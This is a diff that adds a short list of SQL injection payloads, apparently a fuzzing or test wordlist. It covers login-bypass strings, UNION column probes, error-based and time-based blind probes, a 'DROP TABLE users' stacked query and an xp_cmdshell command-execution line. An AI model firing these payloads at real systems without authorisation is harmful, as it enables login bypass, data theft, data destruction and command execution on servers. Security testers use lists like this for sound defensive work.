@@ -1,0 +1,21 @@
+' OR '1'='1
+' OR '1'='1'--
+' OR '1'='1'/*
+" OR "1"="1
+" OR "1"="1"--
+1' OR '1'='1
+1' AND '1'='1
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+1 OR 1=1
+1' OR '1'='1' --
+admin'--
+' OR 1=1--
+' OR 'x'='x
+1; DROP TABLE users--
+'; EXEC xp_cmdshell('dir')--
+' AND 1=CONVERT(int,@@version)--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--
+' OR SLEEP(5)--
+1' AND SLEEP(5)--
